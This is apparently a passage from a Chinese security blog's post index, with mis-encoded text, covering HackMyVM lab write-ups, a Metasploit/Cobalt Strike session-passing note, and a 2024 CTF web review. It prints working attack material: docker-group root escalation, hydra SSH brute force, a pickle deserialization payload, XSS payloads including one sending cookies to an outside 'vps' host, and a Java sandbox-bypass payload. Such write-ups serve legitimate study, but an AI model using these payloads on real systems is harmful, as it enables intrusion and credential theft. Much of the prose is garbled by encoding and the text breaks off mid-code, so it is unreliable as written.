&quot; name echo &quot;&quot;read -p &quot;Enter message for $name :&quot; msg echo &quot;&quot;echo &quot;Sending message to $name &quot;$msg 2&gt; /dev/null echo &quot;&quot;echo &quot;Message sent to $name :) &quot; echo &quot;&quot; ç›´æ¥sudoè¿è¡Œå¯ä»¥ææƒåˆ°selenaï¼Œç„¶åç”¨pythonè·å–ä¼ªç»ˆç«¯ 1234567891011121314151617ariana@pwned:/home$ sudo -u selena /home/messenger.shWelcome to linux.messengerariana:selena:ftpuser:Enter username to send message : selenaEnter message for selena :bashSending message to selenaiduid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;selena@pwned:/home$ selenaçš„ä¸»ç›®å½•ä¸‹æœ‰ä¸€ä¸ªuser2.txt é€šè¿‡idèƒ½çœ‹åˆ°ç”¨æˆ·åœ¨dockerç»„é‡Œ 12selena@pwned:/$ iduid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker) 123456selena@pwned:/$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEprivesc latest 09ae39f0f8fc 4 years ago 88.3MB&lt;none&gt; &lt;none&gt; e13ad046d435 4 years ago 88.3MBalpine latest a24bb4013296 4 years ago 5.57MBdebian wheezy 10fcec6d95c4 5 years ago 88.3MB dockerææƒ 123selena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt shid# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo) ææƒæˆåŠŸ æ€»ç»“é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker è½¯ä»¶åŒ…æ˜¯ä¼šé»˜è®¤æ·»åŠ ä¸€ä¸ª docker ç”¨æˆ·ç»„çš„ã€‚Docker å®ˆæŠ¤è¿›ç¨‹ä¼šå…è®¸ root ç”¨æˆ·å’Œ dockerç»„ç”¨æˆ·è®¿é—® Dockerï¼Œç»™ç”¨æˆ·æä¾› Docker æƒé™ï¼›ç”¨æˆ·åœ¨dockerç»„é‡Œå°±å¯ä»¥å…sudoè¿è¡Œdockerï¼Œè€Œå®¹å™¨å†…é»˜è®¤æ˜¯rootç”¨æˆ·ï¼Œç”¨-vé€‰é¡¹å°†ç”¨æˆ·å¤–çš„ç›®å½•æ˜ å°„åˆ°å®¹å™¨å†…æ—¢å¯ä»¥ä»¥rootç”¨æˆ·å»ä¿®æ”¹æ–‡ä»¶","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Gift","slug":"HackmyVM-Gift","date":"2025-01-22T05:49:56.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-Gift/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Gift/","excerpt":"","text":"ä¿¡æ¯æœé›†ç”¨arp-scanæ‰«æ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.200 08:00:27:5f:2f:1e PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.217 b4:0f:b3:8e:31:07 vivo Mobile Communication Co., Ltd.5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 5 responded ipåœ°å€ä¸º192.168.31.200ï¼Œç„¶ånmapæ‰«æå¼€æ”¾çš„ç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.200 --min-rate=1000Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 00:40 ESTNmap scan report for gift (192.168.31.200)Host is up (0.0080s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:5F:2F:1E (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds åªå¼€å¯äº†22å’Œ80ç«¯å£ 12345â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl http://192.168.31.200/Dont Overthink. Really, Its simple. &lt;!-- Trust me --&gt; ç›®å½•æ‰«æä¹Ÿåªæœ‰ä¸€ä¸ªindex.html,80ç«¯å£æ²¡æœ‰å…¥å£ç‚¹ï¼Œåªèƒ½æ‰¾22ç«¯å£,ç”¨hydraçˆ†ç ´rootå¯†ç  1[22][ssh] host: 192.168.31.200 login: root password: simple SSHç™»å½•ssh &#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x33;&#x31;&#46;&#50;&#x30;&#48; èƒ½ç›´æ¥æŸ¥çœ‹root.txtå’Œuser.txt æ€»ç»“Dont Overthink. Really, Its simple.ï¼ŒEasyé¶åœº,hydraç›´æ¥çˆ†ç ´æ²¡ä»€ä¹ˆå¥½è¯´çš„","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"è®°çº¢æ—¥é¶åœº2è¿‡ç¨‹ä¸­çš„ä¸è¶³","slug":"è®°çº¢æ—¥é¶åœº2è¿‡ç¨‹ä¸­çš„ä¸è¶³","date":"2024-11-11T11:31:08.000Z","updated":"2025-04-19T13:25:36.762Z","comments":true,"path":"2024/11/11/è®°çº¢æ—¥é¶åœº2è¿‡ç¨‹ä¸­çš„ä¸è¶³/","permalink":"https://lvzhouhang.xyz/2024/11/11/%E8%AE%B0%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%8D%E8%B6%B3/","excerpt":"","text":"msfæ´¾ç”Ÿcs123456789#msfbackgrounduse exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset DisablePayloadHandler trueset lhost 192.168.116.131set lport 9000set session 2run csçš„ç›‘å¬è¦å’Œlportçš„ç«¯å£ä¸€æ · csæ´¾ç”Ÿmsf123456#msfbackgrounduse payload payload/windows/meterpreter/reverse_httpset lhost 192.168.116.131set lport 9001run csæ–°å»ºä¸€ä¸ªforeing httpç›‘å¬è®¾ç½®å’Œmsfçš„è®¾ç½®ä¸€æ ·ï¼Œç„¶åcsæ–°å»ºä¼šè¯åˆ°è¿™ä¸ªç›‘å¬å™¨å³å¯ã€‚ å…¶å®ä¸æ­¢è¿™ä¹ˆå¤šï¼ŒåŒ…æ‹¬è¿›ç¨‹è¿ç§»ï¼Œç¥¨æ®ä¹‹ç±»çš„ä¸€ä¸ªcså…¨éƒ¨æå®šäº†å°±ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æƒ³å°è¯•ä¸€ä¸‹æ€ä¹ˆç”¨çº¯æ‰‹åŠ¨æ‰“é¶è€Œä¸”æ‰“é¶ç¯å¢ƒè¿‡äºç†æƒ³å®Œå…¨æ²¡æœ‰è€ƒè™‘è¿‡æµé‡ç‰¹å¾çš„é—®é¢˜ï¼Œæœ‰æœºä¼šäº†è¡¥ä¸€ç¯‡ï¼Œå†…ç½‘çš„å­¦ä¹ è·¯æ¼«æ¼«ã€‚","categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://lvzhouhang.xyz/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"å†…ç½‘","slug":"å†…ç½‘","permalink":"https://lvzhouhang.xyz/tags/%E5%86%85%E7%BD%91/"}]},{"title":"2024å¼ºç½‘æ‹Ÿæ€å¤ç›˜","slug":"2024å¼ºç½‘æ‹Ÿæ€å¤ç›˜","date":"2024-10-21T07:27:08.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2024/10/21/2024å¼ºç½‘æ‹Ÿæ€å¤ç›˜/","permalink":"https://lvzhouhang.xyz/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/","excerpt":"","text":"webå¤ç›˜ä¸€ä¸‹å§åªåšå‡ºæ¥äº†ä¸¤é“ï¼Œæ‰€æœ‰é¢˜éƒ½æœ‰ä¸€ç‚¹æ€è·¯ï¼Œä½†æ˜¯åªæœ‰ä¸€ç‚¹ç‚¹å¯æƒœå¯æƒœï¼Œå¤ªå¯æƒœäº†ã€‚ capooè¿™æ˜¯ä¸ªéé¢„æœŸï¼Œcapoo.phpå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œèƒ½è¯»å–åˆ°start.sh,start.shä¸­æ³„éœ²äº†flagçš„åå­—ï¼Œç›´æ¥è¯»å–å°±è¡Œ ez_picker123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#æºç from sanic import Sanicfrom sanic.response import json,file as file_,text,redirectfrom sanic_cors import CORSfrom key import secret_keyimport osimport pickleimport timeimport jwtimport ioimport builtinsapp = Sanic(&quot;App&quot;)pickle_file = &quot;data.pkl&quot;my_object = &#123;&#125;users = []safe_modules = &#123; &#x27;math&#x27;, &#x27;datetime&#x27;, &#x27;json&#x27;, &#x27;collections&#x27;,&#125;safe_names = &#123; &#x27;sqrt&#x27;, &#x27;pow&#x27;, &#x27;sin&#x27;, &#x27;cos&#x27;, &#x27;tan&#x27;, &#x27;date&#x27;, &#x27;datetime&#x27;, &#x27;timedelta&#x27;, &#x27;timezone&#x27;, &#x27;loads&#x27;, &#x27;dumps&#x27;, &#x27;namedtuple&#x27;, &#x27;deque&#x27;, &#x27;Counter&#x27;, &#x27;defaultdict&#x27;&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in safe_modules and name in safe_names: return getattr(builtins, name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %(module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()CORS(app, supports_credentials=True, origins=[&quot;http://localhost:8000&quot;, &quot;http://127.0.0.1:8000&quot;])class User: def __init__(self,username,password): self.username=username self.password=password def merge(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)def token_required(func): async def wrapper(request, *args, **kwargs): token = request.cookies.get(&quot;token&quot;) if not token: return redirect(&#x27;/login&#x27;) try: result=jwt.decode(token, str(secret_key), algorithms=[&#x27;HS256&#x27;], options=&#123;&quot;verify_signature&quot;: True&#125;) except jwt.ExpiredSignatureError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Token expired&quot;&#125;, status=401) except jwt.InvalidTokenError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid token&quot;&#125;, status=401) print(result) if result[&quot;role&quot;]!=&quot;admin&quot;: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Permission Denied&quot;&#125;, status=401) return await func(request, *args, **kwargs) return wrapper@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])def file_reader(request): file = &quot;app.py&quot; with open(file, &#x27;r&#x27;) as f: content = f.read() return text(content)@app.route(&#x27;/upload&#x27;, methods=[&quot;GET&quot;,&quot;POST&quot;])@token_requiredasync def upload(request): if request.method==&quot;GET&quot;: return await file_(&#x27;templates/upload.html&#x27;) if not request.files: return text(&quot;No file provided&quot;, status=400) file = request.files.get(&#x27;file&#x27;) file_object = file[0] if isinstance(file, list) else file try: new_data = restricted_loads(file_object.body) try: my_object.update(new_data) except: return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object loaded but not updated&quot;&#125;) with open(pickle_file, &quot;wb&quot;) as f: pickle.dump(my_object, f) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object updated&quot;&#125;) except pickle.UnpicklingError: return text(&quot;Dangerous pickle file&quot;, status=400) @app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])async def register(request): if request.method==&#x27;GET&#x27;: return await file_(&#x27;templates/register.html&#x27;) if request.json: NewUser=User(&quot;username&quot;,&quot;password&quot;) merge(request.json, NewUser) users.append(NewUser) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Register Success!&quot;,&quot;redirect&quot;: &quot;/login&quot;&#125;)@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])async def login(request): if request.method==&#x27;GET&#x27;: return await file_(&#x27;templates/login.html&#x27;) if request.json: username = request.json.get(&quot;username&quot;) password = request.json.get(&quot;password&quot;) if not username or not password: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Username or password missing&quot;&#125;, status=400) user = next((u for u in users if u.username == username), None) if user: if user.password == password: data=&#123;&quot;user&quot;:username,&quot;role&quot;:&quot;guest&quot;&#125; data[&#x27;exp&#x27;] = int(time.time()) + 60 *5 token = jwt.encode(data, str(secret_key), algorithm=&#x27;HS256&#x27;) response = json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;redirect&quot;: &quot;/upload&quot;&#125;) response.cookies[&quot;token&quot;]=token response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = request.headers.get(&#x27;origin&#x27;) return response else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid password&quot;&#125;, status=400) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;&#125;, status=404) return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=8000) è€ƒç‚¹å°±æ˜¯åŸå‹é“¾æ±¡æŸ“+pickleååºåˆ—åŒ–+jwtä¼ªé€ ï¼Œæˆ‘å½“æ—¶æ„Ÿè§‰æœ€éš¾çš„æ˜¯é‚£ä¸ªpickleååºåˆ—åŒ–ï¼Œå› ä¸ºä»–æ˜¯ç™½åå•è™½ç„¶å¯ä»¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“è¿›è¡Œä¿®æ”¹ä½†æ˜¯è¿™æ˜¯ç”±äºå¯¹åŸç†ä»¥åŠå†…å»ºæ¨¡å—çš„ä¸ç†Ÿæ‚‰å¯¼è‡´çš„ï¼Œå…¶å®åªéœ€è¦æŠŠç”¨åˆ°çš„æ¨¡å—å’Œå‘½ä»¤åŠ å…¥å°±è¡Œæ¯”å¦‚builtinsã€getattrã€popenåŠ å…¥å°±å¥½äº† 123456789#æ±¡æŸ“é“¾&#123;&quot;__init__&quot;:&#123; &quot;__globals__&quot;:&#123; &quot;secret_key&quot;:&quot;66666&quot;, &quot;safe_modules&quot;:[&quot;os&quot;], &quot;safe_names&quot;:[&quot;eval&quot;], &#125; &#125;&#125; 12345#pickleé“¾b&#x27;&#x27;&#x27;(cosevalS&#x27;os.system(\\&quot;calc\\&quot;)&#x27;o.&#x27;&#x27;&#x27; Spreader1234567891011121314151617181920212223242526272829303132333435363738# app.jsconst express = require(&#x27;express&#x27;);const session = require(&#x27;express-session&#x27;);const stringRandom = require(&#x27;string-random&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const app = express();const port = 3000;const AdminPassWord=stringRandom(16, &#123; numbers: true &#125;)const PrivilegedPassWord=stringRandom(16, &#123; numbers: true &#125;)const PlainPassWord=stringRandom(16, &#123; numbers: true &#125;)const secret_key=stringRandom(16, &#123; numbers: true &#125;)const users = [];const posts = [];const store = [];users.push(&#123; username:&quot;admin&quot;, password:AdminPassWord, role: &quot;admin&quot; &#125;);users.push(&#123; username:&quot;privileged&quot;, password:PrivilegedPassWord, role: &quot;privileged&quot; &#125;);users.push(&#123; username:&quot;plain&quot;, password:PlainPassWord, role: &quot;plain&quot; &#125;);console.log(users)app.use(express.static(&#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(bodyParser.urlencoded(&#123; extended: true &#125;));app.use(session(&#123; secret: secret_key, resave: false, saveUninitialized: true, cookie: &#123; httpOnly: false, secure: false, &#125;&#125;));app.use(&#x27;/&#x27;, require(&#x27;./index&#x27;)(users,posts,store,AdminPassWord,PrivilegedPassWord));app.listen(port, () =&gt; &#123; console.log(`App is running on http://localhost:$&#123;port&#125;`);&#125;); 12345678910111213141516171819202122232425262728#bot.jsconst puppeteer = require(&#x27;puppeteer&#x27;);async function triggerXSS(UserName, PassWord) &#123; const browser = await puppeteer.launch(&#123; args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-setuid-sandbox&#x27;], executablePath: &#x27;/usr/bin/chromium&#x27;, headless: true &#125;); const page = await browser.newPage(); await page.goto(&#x27;http://localhost:3000/login&#x27;); await page.type(&#x27;input[name=&quot;username&quot;]&#x27;, UserName); await page.type(&#x27;input[name=&quot;password&quot;]&#x27;, PassWord); await page.click(&#x27;button[type=&quot;submit&quot;]&#x27;); await page.goto(&#x27;http://localhost:3000/&#x27;); await browser.close(); return;&#125;module.exports = &#123; triggerXSS &#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#index.jsconst fs = require(&#x27;fs&#x27;);const express = require(&#x27;express&#x27;);const router = express.Router();const &#123; triggerXSS &#125; = require(&#x27;../bot&#x27;);const &#123; Store &#125; = require(&#x27;express-session&#x27;);function isAuthenticated(req, res, next) &#123; if (req.session.user) &#123; next(); &#125; else &#123; res.redirect(&#x27;/login&#x27;); &#125;&#125;module.exports = (users,posts,store,AdminPassWord,PrivilegedPassWord) =&gt; &#123; const ROLES = &#123; PLAIN: &quot;plain&quot;, PRIVILEGED: &quot;privileged&quot;, ADMIN: &quot;admin&quot;, &#125;; router.get(&#x27;/register&#x27;, (req, res) =&gt; &#123; res.sendFile(&#x27;register.html&#x27;, &#123; root: &#x27;./views&#x27; &#125;); &#125;); router.post(&#x27;/register&#x27;, (req, res) =&gt; &#123; const &#123; username, password, role &#125; = req.body; const userExists = users.some(u =&gt; u.username === username); if (userExists) &#123; return res.send(&#x27;Username already exists!&#x27;); &#125; users.push(&#123; username, password, role: &quot;plain&quot; &#125;); res.redirect(&#x27;/login&#x27;); &#125;); router.get(&#x27;/login&#x27;, (req, res) =&gt; &#123; res.sendFile(&#x27;login.html&#x27;, &#123; root: &#x27;./views&#x27; &#125;); &#125;); router.post(&#x27;/login&#x27;, (req, res) =&gt; &#123; const &#123; username, password &#125; = req.body; console.log(username); console.log(password); const user = users.find(u =&gt; u.username === username &amp;&amp; u.password === password); if (user) &#123; req.session.user = user; res.redirect(&#x27;/&#x27;); &#125; else &#123; res.send(&#x27;Invalid credentials!&#x27;); &#125; &#125;); router.get(&#x27;/&#x27;, isAuthenticated, (req, res) =&gt; &#123; const currentUser = req.session.user; let filteredPosts = []; if (currentUser.role === ROLES.ADMIN) &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PRIVILEGED || p.role === ROLES.ADMIN); &#125; else if (currentUser.role === ROLES.PRIVILEGED) &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PLAIN || p.role === ROLES.PRIVILEGED); &#125; else &#123; filteredPosts = posts.filter(p =&gt; p.role === ROLES.PLAIN); &#125; res.render(`$&#123;currentUser.role&#125;`, &#123; posts: filteredPosts, user: currentUser &#125;); &#125;); router.post(&#x27;/post&#x27;, isAuthenticated, (req, res) =&gt; &#123; let &#123; content &#125; = req.body; const scriptTagRegex = /&lt;script\\b[^&lt;]*(?:(?!&lt;\\/script&gt;)&lt;[^&lt;]*)*&lt;\\/script&gt;/gi; content = content.replace(scriptTagRegex, &#x27;[XSS attempt blocked]&#x27;); const eventHandlerRegex = /on\\w+\\s*=\\s*([&quot;&#x27;]).*?\\1/gi; content = content.replace(eventHandlerRegex, &#x27;[XSS attempt blocked]&#x27;); const javascriptURLRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*javascript:.*?\\1/gi; content = content.replace(javascriptURLRegex, &#x27;[XSS attempt blocked]&#x27;); const dataURLRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*data:.*?\\1/gi; content = content.replace(dataURLRegex, &#x27;[XSS attempt blocked]&#x27;); const cssExpressionRegex = /style\\s*=\\s*([&quot;&#x27;]).*?expression\\([^&gt;]*?\\).*?\\1/gi; content = content.replace(cssExpressionRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousTagsRegex = /&lt;\\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi; content = content.replace(dangerousTagsRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousAttributesRegex = /\\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\\s*=\\s*([&quot;&#x27;]).*?\\1/gi; content = content.replace(dangerousAttributesRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousProtocolsRegex = /(?:href|src)\\s*=\\s*([&quot;&#x27;])(?:\\s*javascript:|vbscript:|file:|data:|filesystem:).*?\\1/gi; content = content.replace(dangerousProtocolsRegex, &#x27;[XSS attempt blocked]&#x27;); const dangerousFunctionsRegex = /\\b(?:eval|alert|prompt|confirm|console\\.log|Function)\\s*\\(/gi; content = content.replace(dangerousFunctionsRegex, &#x27;[XSS attempt blocked]&#x27;); posts.push(&#123; content: content, username: req.session.user.username, role: req.session.user.role &#125;); res.redirect(&#x27;/&#x27;); &#125;); router.get(&#x27;/logout&#x27;, (req, res) =&gt; &#123; req.session.destroy(); res.redirect(&#x27;/login&#x27;); &#125;); router.get(&#x27;/report_admin&#x27;, async (req, res) =&gt; &#123; try &#123; await triggerXSS(&quot;admin&quot;,AdminPassWord); res.send(`Admin Bot successfully logged in.`); &#125; catch (error) &#123; console.error(&#x27;Error Reporting:&#x27;, error); res.send(`Admin Bot successfully logged in.`); &#125; &#125;); router.get(&#x27;/report_privileged&#x27;, async (req, res) =&gt; &#123; try &#123; await triggerXSS(&quot;privileged&quot;,PrivilegedPassWord); res.send(`Privileged Bot successfully logged in.`); &#125; catch (error) &#123; console.error(&#x27;Error Reporting:&#x27;, error); res.send(`Privileged Bot successfully logged in.`); &#125; &#125;); router.get(&#x27;/store&#x27;, async (req, res) =&gt; &#123; return res.status(200).json(store); &#125;); router.post(&#x27;/store&#x27;, async (req, res) =&gt; &#123; if (req.body) &#123; store.push(req.body); return res.status(200).send(&#x27;Data stored successfully&#x27;); &#125; else &#123; return res.status(400).send(&#x27;No data received&#x27;); &#125; &#125;); router.get(&#x27;/flag&#x27;, async (req, res) =&gt; &#123; try &#123; if (req.session.user &amp;&amp; req.session.user.role === &quot;admin&quot;) &#123; fs.readFile(&#x27;/flag&#x27;, &#x27;utf8&#x27;, (err, data) =&gt; &#123; if (err) &#123; console.error(&#x27;Error reading flag file:&#x27;, err); return res.status(500).send(&#x27;Internal Server Error&#x27;); &#125; res.send(`Your Flag Here: $&#123;data&#125;`); &#125;); &#125; else &#123; res.status(403).send(&#x27;Unauthorized!&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;Error fetching flag:&#x27;, error); res.status(500).send(&#x27;Internal Server Error&#x27;); &#125; &#125;); return router;&#125;; è¿™ä¸ªé¢˜ä¸€çœ¼xsså˜›ï¼Œç„¶åæœ‰ä¸¤ç§è§£é¢˜æ€è·¯ï¼Œä¸€ä¸ªæ˜¯æ’å…¥jsä»£ç åˆ©ç”¨/storeè·¯ç”±ï¼Œç„¶åè®¿é—®/report_privilegedå°†privilegeç”¨æˆ·çš„cookieå‚¨å­˜åˆ°/storeä¸­ï¼Œç„¶ååŒæ ·çš„æ­¥éª¤å†æ¥ä¸€æ¬¡è·å–adminçš„cookie 12&lt;script&gt;fetch(&#x27;/store&#x27;,&#123;body:&quot;&#x27;&#x27;p&quot;+`rivileged_cookie&#x27;&#x27;=`+encodeURIComponent(document.cookie),method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;&#125;)&lt;/script&gt; æˆ–è€…å°±æ˜¯ç›´æ¥å¼¹å‡ºprivilegeå’Œadminçš„cookie 1&lt;img src=&quot;&quot; onerror=document.location=&#x27;http://vps:port?cookie=&#x27;+document.cookie /&gt; OnlineRunnerè¿™é“é¢˜æ²¡æœ‰åŠæ³•ç”¨importçš„æ–¹å¼æ¥å¯¼å…¥ç±»ï¼Œèƒ½æ‰§è¡Œå‘½ä»¤çš„éƒ½ä¸èƒ½ç”¨ï¼Œåå°„ä¹Ÿæ²¡æœ‰åŠæ³•ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œçœ‹åˆ«çš„å¸ˆå‚…æ˜¯è¦ç»•è¿‡ä¸€ä¸ªæ²™ç®± æ¢ç´¢Java RASP Bypassæ–°å§¿åŠ¿ è¿™é‡Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ‡µï¼Œç›´æ¥è´´åˆ«çš„å¸ˆå‚…çš„payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134String[] files = &#123;&quot;/proc/net/tcp&quot;, &quot;/proc/net/tcp6&quot;&#125;; for (int f = 0; f &lt; files.length; f++) &#123; try &#123; java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(files[f])); String line; reader.readLine(); // Skip header line while ((line = reader.readLine()) != null) &#123; line = line.trim(); String[] parts = line.split(&quot;\\\\s+&quot;); if (parts.length &gt; 3) &#123; String local_address = parts[1]; String state = parts[3]; // State 0A means LISTEN if (state.equals(&quot;0A&quot;)) &#123; String[] addrPort = local_address.split(&quot;:&quot;); String ipHex = addrPort[0]; String portHex = addrPort[1]; String ip = &quot;&quot;; if (files[f].endsWith(&quot;tcp6&quot;)) &#123; // IPv6 address parsing StringBuilder ipBuilder = new StringBuilder(); for (int i = ipHex.length(); i &gt; 0; i -= 8) &#123; String segment = ipHex.substring(Math.max(i - 8, 0), i); StringBuilder segBuilder = new StringBuilder(); for (int j = segment.length(); j &gt; 0; j -= 2) &#123; segBuilder.append(segment.substring(j - 2, j)); &#125; ipBuilder.insert(0, segBuilder.toString()); if (i &gt; 8) &#123; ipBuilder.insert(0, &quot;:&quot;); &#125; &#125; ip = ipBuilder.toString(); &#125; else &#123; // IPv4 address parsing StringBuilder ipBuilder = new StringBuilder(); for (int i = ipHex.length(); i &gt; 0; i -= 2) &#123; String part = ipHex.substring(i - 2, i); int num = Integer.parseInt(part, 16); ipBuilder.insert(0, num); if (i &gt; 2) &#123; ipBuilder.insert(0, &quot;.&quot;); &#125; &#125; ip = ipBuilder.toString(); &#125; int port = Integer.parseInt(portHex, 16); System.out.println(&quot;Listening on &quot; + ip + &quot;:&quot; + port); &#125; &#125; &#125; reader.close(); &#125; catch (java.io.IOException e) &#123; System.out.println(e); &#125; &#125;try &#123; java.net.URL url = new java.net.URL(&quot;http://127.0.0.1:46461/sandbox/default/module/http/sandbox-control/shutdown&quot;); java.net.HttpURLConnection connection = (java.net.HttpURLConnection) url.openConnection(); connection.setRequestMethod(&quot;GET&quot;); java.io.BufferedReader reader = new java.io.BufferedReader( new java.io.InputStreamReader(connection.getInputStream()) ); String line; StringBuilder response = new StringBuilder(); while ((line = reader.readLine()) != null) &#123; response.append(line).append(&quot;\\n&quot;); &#125; reader.close(); connection.disconnect(); System.out.println(response.toString()); System.out.println(connection.getResponseCode()); &#125; catch (java.io.IOException e) &#123; System.out.println(e); &#125; try &#123; String command = &quot;/readflag&quot;; // Use &quot;dir&quot; on Windows java.lang.Process process = java.lang.Runtime.getRuntime().exec(command); java.io.BufferedReader reader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream()) ); String line; while ((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; reader.close(); process.waitFor(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;/*try&#123;java.io.File folder = new java.io.File(&quot;/home&quot;); if (!folder.isDirectory()) &#123; System.out.println(&quot;Provided path is not a folder&quot;); return; &#125; java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream(); java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos); java.util.Stack&lt;java.io.File&gt; stack = new java.util.Stack&lt;java.io.File&gt;(); stack.push(folder); while (!stack.isEmpty()) &#123; java.io.File currentFile = stack.pop(); if (currentFile.isDirectory()) &#123; java.io.File[] fileList = currentFile.listFiles(); if (fileList != null) 